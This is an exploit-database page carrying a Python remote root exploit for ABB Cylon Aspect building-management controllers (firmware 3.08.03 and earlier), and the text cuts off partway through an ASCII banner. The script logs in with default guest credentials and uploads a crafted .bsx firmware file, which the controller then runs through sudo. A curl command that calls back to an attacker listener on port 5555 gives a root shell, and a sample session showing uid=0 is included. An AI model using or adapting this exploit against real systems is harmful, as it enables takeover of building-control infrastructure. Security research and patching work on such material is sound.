---
title: ABB Cylon Aspect 3.08.03 Guest2Root Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025060001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-03
fetch_date: 2025-10-06T22:47:50.664916
---

# ABB Cylon Aspect 3.08.03 Guest2Root Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ABB Cylon Aspect 3.08.03 Guest2Root Privilege Escalation** **2025.06.02**  Credit:  **[Gjoko 'LiquidWorm' Krstic](https://cxsecurity.com/author/Gjoko%2B%26%23039%3BLiquidWorm%26%23039%3B%2BKrstic/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

#!/usr/bin/env python
#
#
# Exploit Title: ABB Cylon Aspect 3.08.03 - Guest2Root Privilege Escalation
#
#
# Vendor: ABB Ltd.
# Product web page: https://www.global.abb
# Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
# Firmware: <=3.08.03
#
# Summary: ASPECT is an award-winning scalable building energy management
# and control solution designed to allow users seamless access to their
# building data through standard building protocols including smart devices.
#
# Desc: The ABB BMS/BAS controller is vulnerable to code execution and sudo
# misconfiguration flaws. An authenticated remote code execution vulnerability
# in the firmware update mechanism allows an attacker with valid credentials to
# escalate privileges and execute commands as root. The process involves uploading
# a crafted .bsx file through projectUpdateBSXFileProcess.php, which is then moved
# to htmlroot and executed by projectUpdateBSXExecute.php. This script leverages
# sudo to run the uploaded bsx file, enabling the attacker to bypass input validation
# checks and execute arbitrary code, leading to full system compromise and unauthorized
# root access.
#
# ---------------------------------------------------------------------------------
#
# $ ./bsxroot.py 192.168.73.31 192.168.73.9 --creds guest:guest
# [o] Exploit starting at 21.05.2025 12:33:47
# [o] Using credentials: guest:\*\*\*\*\*
# [o] Auth successfull.
# [o] PHPSESSID: g02p9tnog4d2r1z4eha1e9e688
# [o] Listening on 192.168.73.9:5555...
# [o] Building name: ["Tower 3"]
# [o] runtime.ver=v3.08.03
# [+] -> [virtual] rootshell
#
# # id
# uid=0(root) gid=0(root) groups=0(root)
# # pwd
# /home/MIX\_CMIX/htmlroot
# exit
# [o] Removing callback file.
# [!] Connection terminated.
#
# ---------------------------------------------------------------------------------
#
#
# Tested on: GNU/Linux 3.15.10 (armv7l)
# GNU/Linux 3.10.0 (x86\_64)
# GNU/Linux 2.6.32 (x86\_64)
# Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
# Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
# PHP/7.3.11
# PHP/5.6.30
# PHP/5.4.16
# PHP/4.4.8
# PHP/5.3.3
# AspectFT Automation Application Server
# lighttpd/1.4.32
# lighttpd/1.4.18
# Apache/2.2.15 (CentOS)
# OpenJDK Runtime Environment (rhel-2.6.22.1.-x86\_64)
# OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# @zeroscience
#
#
# Advisory ID: ZSL-2025-5947
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5947.php
#
#
# 21.04.2024
#
#
from colorama import init, Fore
from urllib.parse import quote
from time import sleep
import threading
import datetime
import requests
import socket
import re
import os
import sys
init()
def safe(\*trigger, ):
return True
def auth(target\_ip, user, pwd):
login\_ep = f"http://{target\_ip}/validate/login.php"
payload = {
'f\_user' : user, # 'aamuser, guest'
'f\_pass' : pwd, # 'default, guest'
'submit' : 'Login'
}
sess = requests.Session()
r = sess.post(login\_ep, data=payload)
if r.status\_code == 200 and 'PHPSESSID' in sess.cookies:
print("[o] Auth successfull.")
phpsessid = sess.cookies.get('PHPSESSID')
print("[o] PHPSESSID:", phpsessid)
return sess.cookies
else:
print("[!] Auth failed.")
return None
def kacuj(target\_ip, listen\_ip, cmd, token=None, cookies=None):
agentwho = "NetRanger/84.19"
payload = f"curl -A \"`{cmd}`\" {listen\_ip}:5555"
url = f"http://{target\_ip}/projectUpdateBSXFileProcess.php"
headers = {
"Content-Type": "multipart/form-data; boundary=----zeroscience",
"User-Agent": agentwho
}
data = (
"------zeroscience\r\n"
f"Content-Disposition: form-data; name=\"userfile\"; filename={AAM}\r\n"
"Content-Type: application/octet-stream\r\n\r\n"
f"{payload}\r\n"
'------zeroscience--\r\n'
)
try:
r = requests.post(url, headers=headers, data=data, cookies=cookies)
if r.status\_code == 200:
url\_execute = f"http://{target\_ip}/projectUpdateBSXExecute.php?file={AAM}"
r = requests.get(url\_execute, cookies=cookies)
return r.content
except requests.exceptions.RequestException as e:
print(f"[!] Error sending payload: {e}")
return None
def koj\_slusha(listen\_ip):
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
s.bind(("0.0.0.0", 5555))
s.listen(1)
print(f"[o] Listening on {listen\_ip}:5555...")
while True:
conn, addr = s.accept()
try:
data = conn.recv(9999)
if not data:
print("[!] Connection closed by remote host.")
break
dd = data.decode("utf-8", errors="ignore")
uam = re.search(r"User-Agent:\s\*(.\*)\s\*Host:", dd, re.DOTALL)
if uam:
print(uam.group(1), end="")
else:
print
#print(f"[o] Full response:\n{dd}")
except Exception as e:
print(f"[!] Error while receiving data: {e}")
finally:
conn.close()
def main():
if safe(True):
print("\nSafety: \033[92mON\033[0m")
exit(-17)
else:
next
global AAM
global start
AAM = "firmware.bsx"
start = datetime.datetime.now()
start = start.strftime("%d.%m.%Y %H:%M:%S")
title = "\033[96mABB Cylon® ASPECT® Supervisory Building Control v3.08.03\033[0m"
subtl = "\033[95m\t\t-> Remote Root Exploit <-\033[0m"
prj = f"""
P R O J E C T\033[90m
.|
| |
|'| .\_\_\_\_\_
\_\_\_ | | |. |' .---"|
\_ .-' '-. | | .--'| || | \_| |
.-'| \_.| | || '-\_\_ | | | || |
|' | |. | || | | | | || |
\_\_\_\_| '-' ' "" '-' '-.' '` |\_\_\_\_
░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓...